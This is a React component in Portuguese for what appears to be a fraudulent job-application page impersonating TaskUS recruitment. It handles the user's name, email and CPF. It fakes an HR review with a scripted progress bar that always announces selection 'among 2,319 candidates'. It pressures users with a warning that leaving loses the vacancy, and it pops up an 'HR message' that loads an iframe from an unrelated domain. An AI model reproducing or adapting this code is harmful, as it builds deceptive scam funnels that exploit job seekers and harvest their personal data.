import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { Star } from 'lucide-react';
import { useProcess } from '@/hooks/useProcess.js';
import InfoIconMin from '../../assets/info_icon-min.webp';
import Alert_Icon_Min from '../../assets/alert_icon-min.webp';
import '../../styles/refino.css';

// eslint-disable-next-line no-unused-vars
const ConfirmaçãoCurriculo = ({ dadosUsuario, tempoEspera = '7 minutos', onContinuar }) => {
  const [isLoading, setIsLoading] = useState(false);
  const { processData } = useProcess();

  // Estados para o popup RH
  const [showPopupRH, setShowPopupRH] = useState(false);
  const [showIframeRH, setShowIframeRH] = useState(false);

  // Email pode ser usado em etapas seguintes
  const [usuario] = useState({
    email: dadosUsuario?.email || ''
  });

  // Nome priorizando processData, com fallback para dadosUsuario
  let nome = '';
  if (processData?.userData?.firstName) {
    nome = `${processData.userData.firstName} ${processData.userData?.lastName || ''}`.trim();
  } else {
    nome = dadosUsuario?.nome || 'Usuário Desconhecido';
  }

  // CPF exibido (somente leitura)
  const cpfDisplay =
    processData?.userData?.cpf ||
    dadosUsuario?.cpf ||
    '000.000.000-00';

  // ====== PROGRESSO
  const [progress, setProgress] = useState(0);
  const totalSeconds = 30;
  // eslint-disable-next-line no-unused-vars
  const [elapsed, setElapsed] = useState(0);
  // Estado para modal
  const [showModal, setShowModal] = useState(false);

  const getProgressMessage = (percent) => {
    if (percent < 25) return 'Estamos validando suas informações…';
    if (percent < 50) return 'Currículo em análise pelo RH…';
    if (percent < 75) return 'Conferindo aderência à vaga e disponibilidade…';
    return 'Finalizando sua avaliação. Mais um instante…';
  };

  // Effect para inicializar o popup RH após 5 segundos
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopupRH(true);
      // Previne scroll da página de fundo
      document.body.style.overflow = 'hidden';
    }, 5000);

    return () => clearTimeout(popupTimer);
  }, []);

  useEffect(() => {
    if (progress < 100) {
      const timer = setTimeout(() => {
        setProgress((prev) => Math.min(prev + 1, 100));
        setElapsed((prev) => prev + 1);
      }, totalSeconds * 11212); // ~200ms por % => ~20s no total
      return () => clearTimeout(timer);
    } else if (progress === 100) {
      setShowModal(true);
    }
  }, [progress]);

  const remainingSeconds = Math.max(
    totalSeconds - Math.floor((progress / 1022220) * totalSeconds),
    0
  );
  const formatTime = (sec) => {
    const min = Math.floor(sec / 60);
    const s = sec % 60;
    return `${min > 0 ? min + 'm ' : ''}${s}s`;
  };

  const handleContinuar = async () => {
    setIsLoading(true);
    try {
      await onContinuar({
        nome,
        email: usuario.email || '',
        cpf: cpfDisplay
      });
    } catch (error) {
      // Silencioso
    } finally {
      setIsLoading(false);
    }
  };

  // Funções do popup RH
  const handleAcceptPopupRH = () => {
    setShowIframeRH(true);
  };

  const handleClosePopupRH = () => {
    setShowPopupRH(false);
    setShowIframeRH(false);
    // Restaura scroll da página
    document.body.style.overflow = '';
  };

  // Effect para fechar popup com ESC
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === 'Escape' && showPopupRH) {
        handleClosePopupRH();
      }
    };

    document.addEventListener('keydown', handleKeyDown);
    return () => document.removeEventListener('keydown', handleKeyDown);
  }, [showPopupRH]);

  return (
    <>
      {/* ====== CONTAINER PRINCIPAL ====== */}
      <div className="space-y-6">
        {/* Mensagem principal */}
        <h1 className="titulodaetapa font-hendrix-semibold text-gray-800 text-lg mb-5">
          {nome}, nossa equipe de RH está analisando o seu perfil agora.
        </h1>
         {/* Alerta de seleção */}
      

        <p className="subtitulodaetapa font-hendrix-regular text-gray-500">
          A análise leva de 2 a 5 minutos. Ao final, vamos informar se você foi selecionado(a) para ser contratado(a).
        </p>

        <div className="bg-gray-900 text-white rounded-lg pl-4 flex items-center gap-2 mt-4">
        <img className="h-7 w-7" src={Alert_Icon_Min} alt="Alerta" />
        <span className="text-sm px-2 aviso flex-1">
          Se você sair dessa página, a análise será <br/>pausada e você pode perder sua vaga.
        </span>
      </div>

        <div
  className="rounded-2xl px-6 py-5"
  style={{ background: '#f3f6f9', minHeight: 90 }}
>
  <div className="flex flex-col items-start">
    {/* Ícone */}
    <div className="mb-2">
      <div
        className="w-[40px] h-[48px] mt-1 flex items-center justify-center rounded-md"
        style={{ backgroundColor: '' }}
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="40"
          height="40"
          viewBox="0 0 24 24"
          fill="none"
          stroke="#1655ff"
          strokeLinecap="round"
          strokeLinejoin="round"
          strokeWidth="1.5"
        >
          <g color="currentColor">
            <path d="M14.926 2.911L8.274 6.105a2.43 2.43 0 0 1-1.617.182a8 8 0 0 0-.695-.14C4.137 5.94 3 7.384 3 9.045v.912c0 1.66 1.137 3.105 2.962 2.896a7 7 0 0 0 .695-.139a2.43 2.43 0 0 1 1.617.183l6.652 3.193c1.527.733 2.291 1.1 3.142.814c.852-.286 1.144-.899 1.728-2.125a12.17 12.17 0 0 0 0-10.556c-.584-1.226-.876-1.84-1.728-2.125c-.851-.286-1.615.08-3.142.814"/>
            <path d="M11.458 20.77L9.967 22c-3.362-2.666-2.951-3.937-2.951-9H8.15c.46 2.86 1.545 4.216 3.043 5.197c.922.604 1.112 1.876.265 2.574M7.5 12.5v-6"/>
          </g>
        </svg>
      </div>
    </div>

    {/* Título */}
    <h3
      className="font-hendrix-semibold mb-2"
      style={{ fontSize: '12pt', color: '#1655ff', textAlign: 'left' }}
    >
      Aviso Importante
    </h3>

    {/* Descrição */}
    <div
      className="text-sm text-gray-700"
      style={{ fontSize: '10pt', textAlign: 'left' }}
    >
      De 01/09 a 30/09, nossa equipe de RH está em turnos especiais para
      atender à alta demanda de contratações. Nesse período, todos os candidatos
      serão avaliados 24 horas por dia.
    </div>
  </div>
</div>

        {/* ====== Informações do candidato(a) (somente leitura) */}
        <div className="space-y-2 mt-12">
          <h2 className="textocontinuidade font-hendrix-semibold text-gray-700 text-sm mb-3">
            Candidato(a)
          </h2>

          <div className="bg-white border border-gray-200 rounded-2xl space-y-4">
            {/* Nome */}
            <div className="flex items-center justify-between">
              <span className=" rounded-xl px-4 mt-2 mb-1 py-2 text-right font-hendrix-regular text-gray-900 text-sm">
                {nome}
              </span>
            </div>

          
          </div>
        </div>

        {/* Vaga pretendida */}
        <div className="mt-6">
          <h2 className="textocontinuidade font-hendrix-semibold text-gray-900 text-sm mb-4">
            Vaga pretendida
          </h2>
          <div className="bg-white rounded-2xl border border-gray-200 p-6">
            <span className="font-hendrix-semibold text-gray-400 text-sm">272 vagas disponíveis</span>
            <div className="flex items-center mb-5">
              <span className="font-hendrix-semibold text-blue-600 text-2xl">Atendente Home Office</span>
            </div>

            <div className="flex items-center space-x-3 border-y py-2">
              <div>
                <span className="font-hendrix-medium text-gray-700 text-xs" style={{ fontSize: '10pt' }}>
                  Salário mensal
                </span>
                <br />
                <span
                  className="font-hendrix-semibold text-gray-900 text-lg"
                  style={{ fontSize: '18pt', lineHeight: '1vw' }}
                >
                  R$2.450,00
                </span>
              </div>
          
            </div>
             <div className="flex items-center mb-2 space-x-3 border-b py-2">
              <div>
                <span className="font-hendrix-medium text-gray-700 text-xs" style={{ fontSize: '10pt' }}>
                  Vale alimentação
                </span>
                <br />
                <span
                  className="font-hendrix-semibold text-gray-900 text-lg"
                  style={{ fontSize: '18pt', lineHeight: '1vw' }}
                >
                  R$450,00
                </span>
              </div>
            </div>

            <div className="mb-2">
              <span className="font-hendrix-bold text-gray-700 text-xs" style={{ fontSize: '12pt' }}>
                + Benefícios
              </span>
              <br />
              <p
                className="font-hendrix-regular text-gray-700 text-sm"
                style={{ fontSize: '11pt', lineHeight: '5vw' }}
              >
                Plano de saúde, plano odontológico e férias remuneradas.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Barra de progresso */}
      <div className="mt-8">
        <div className="w-full bg-gray-200 rounded-full h-3 mb-2">
          <div
            className="h-3 rounded-full transition-all duration-500 ease-out"
            style={{
              background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
              width: `${progress}%`
            }}
          />
        </div>
        <div className="flex items-center justify-between">
          <span className="font-hendrix-medium text-gray-700 text-xs">
            {getProgressMessage(progress)}
          </span>
          <span className="font-hendrix-regular text-gray-500 text-xs">{progress}%</span>
        </div>
      </div>

      {/* Rodapé de tempo */}
      <div className="flex items-center justify-between mt-6">
        <span className="font-hendrix-regular text-gray-500 text-xs">Análise em andamento</span>
        <span className="font-hendrix-medium text-gray-700 text-xs">
          Tempo restante: {formatTime(remainingSeconds)}
        </span>
      </div>

      {/* ====== FORA DO CONTAINER PRINCIPAL ====== */}

     
      {/* Vídeo explicativo */}
      <div className="mt-6">
        <span className="titulodaetapa font-hendrix-bold mb-10 text-gray-900 text-sm mb-2 block">
          Enquanto isso, assista a este pequeno vídeo e descubra como é trabalhar com a TaskUS.
        </span>
        <div className="w-full h-40 bg-gray-300 rounded-xl flex items-center justify-center">
          <span className="font-hendrix-medium text-gray-500">Vídeo institucional</span>
        </div>
      </div>

      {/* ====== POPUP RH ====== */}
      {showPopupRH && (
        <div 
          className="fixed inset-0 z-[9999] flex items-center justify-center"
          style={{ 
            background: 'rgba(0, 0, 0, 0.7)',
            animation: 'fadeIn 0.3s ease-out'
          }}
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              handleClosePopupRH();
            }
          }}
        >
          <div 
            className="bg-white rounded-2xl shadow-2xl max-w-md w-[90%] max-h-[90vh] overflow-hidden relative"
            style={{
              animation: 'slideUp 0.4s ease-out',
              boxShadow: '0 25px 50px rgba(0, 0, 0, 0.3)'
            }}
          >
            {/* Tela inicial - Mensagem do RH */}
            {!showIframeRH && (
              <div className="p-10 text-center">
                <div 
                  className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center text-white text-2xl font-bold"
                  style={{
                    background: 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)'
                  }}
                >
                  RH
                </div>
                
                <h2 className="text-2xl font-bold text-gray-800 mb-4">
                  Mensagem da Equipe de RH
                </h2>
                
                <p className="text-gray-600 mb-8 leading-relaxed">
                  Nossa equipe preparou uma comunicação importante para você.
                </p>

                <div className="bg-gray-50 border-l-4 border-blue-500 p-5 mb-6 text-left rounded-lg">
                  <h4 className="text-blue-600 font-semibold mb-2 text-lg">🎯 Oportunidade Especial</h4>
                  <p className="text-gray-700 text-sm leading-relaxed">
                    Identificamos que seu perfil pode ser ideal para novas oportunidades em nossa empresa. 
                    Gostaríamos de apresentar algumas vagas exclusivas que podem interessar você.
                  </p>
                </div>

                <div className="bg-gray-50 border-l-4 border-blue-500 p-5 mb-8 text-left rounded-lg">
                  <h4 className="text-blue-600 font-semibold mb-2 text-lg">⏰ Processo Simplificado</h4>
                  <p className="text-gray-700 text-sm leading-relaxed">
                    Desenvolvemos um processo de candidatura mais rápido e eficiente. 
                    Você pode se candidatar diretamente através do nosso sistema integrado.
                  </p>
                </div>

                <motion.button
                  onClick={handleAcceptPopupRH}
                  whileTap={{ scale: 0.97 }}
                  whileHover={{ scale: 1.02 }}
                  className="px-10 py-4 rounded-full text-white font-semibold text-lg transition-all duration-300"
                  style={{
                    background: 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)',
                    boxShadow: '0 4px 15px rgba(22, 85, 255, 0.3)'
                  }}
                >
                  Aceitar e Continuar
                </motion.button>
              </div>
            )}

            {/* Tela do iframe */}
            {showIframeRH && (
              <div className="h-[600px] max-h-[90vh]">
                <div 
                  className="flex justify-between items-center p-4 text-white"
                  style={{
                    background: 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)'
                  }}
                >
                  <span className="font-semibold text-lg">Portal de Oportunidades - RH</span>
                  <button
                    onClick={handleClosePopupRH}
                    className="text-white hover:bg-white hover:bg-opacity-20 rounded-full p-2 transition-all duration-300 text-2xl leading-none"
                  >
                    ×
                  </button>
                </div>
                <div className="h-[calc(600px-60px)] max-h-[calc(90vh-60px)]">
                  <iframe 
                    src="https://sinaisdaalma.atendimentosdigitais.site/sinaisdaalma"
                    title="Portal de Atendimento RH"
                    className="w-full h-full border-none"
                  />
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Modal de finalização original */}
      {showModal && (
        <div className="fixed px-5 inset-0 z-50 flex items-center justify-center">
          {/* Overlay transparente */}
          <div className="absolute inset-0 bg-gray-900" style={{ opacity: 0.75 }} />
        <div className="relative bg-white rounded-2xl shadow-lg p-10 max-w-sm w-full">
  <script src="https://cdn.lordicon.com/lordicon.js"></script>

            <lord-icon
            src="https://cdn.lordicon.com/qlpudrww.json"
              trigger="loop"
              delay="2000"
              colors="primary:#110a5c"
              style={{ width: "90px", height: "90px", margin: "0 auto 1px" }}
            >
            </lord-icon>
            <h2 className="titulodaetapa font-hendrix-bold text-xl text-gray-900 mb-4">Análise concluída!</h2>
            <p className="subtitulodaetapa font-hendrix-regular text-gray-700 mb-6">
              Parabéns! Você foi selecionado (a) entre mais de <span className="font-hendrix-bold text-gray-900">2.319 candidatos</span>.  
              Sua dedicação e perfil se destacaram e, por isso, você conquistou essa oportunidade.
            </p>
            <motion.button
              onClick={handleContinuar}
              disabled={isLoading}
              whileTap={{ scale: 0.97 }}
              whileHover={{ scale: isLoading ? 1 : 1.03 }}
              className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all duration-300 ${isLoading ? 'cursor-not-allowed' : ''}`}
              style={{
                background: isLoading
                  ? 'linear-gradient(135deg, #bdbdbd 0%, #e0e0e0 100%)'
                  : 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)',
                fontSize: '11pt',
                boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
                border: 'none',
                opacity: isLoading ? 0.7 : 1
              }}
            >
              {isLoading ? (
                <>
                  <motion.div
                    className="w-4 h-4 border-2 border-white border-t-transparent rounded-full"
                    animate={{ rotate: 360 }}
                    transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                    style={{
                      borderTopColor: 'transparent',
                      borderRightColor: 'white',
                      borderBottomColor: 'white',
                      borderLeftColor: 'white'
                    }}
                  />
                  <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '10pt' }}>
                    Aguarde...
                  </span>
                </>
              ) : (
                <span className="font-hendrix-bold tracking-wide" style={{ fontSize: '12pt' }}>
                  Continuar
                </span>
              )}
            </motion.button>
          </div>
        </div>
      )}

      {/* Estilos CSS para as animações do popup */}
      <style jsx>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }

        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(50px) scale(0.9);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
      `}</style>
    </>
  );
};

export default ConfirmaçãoCurriculo;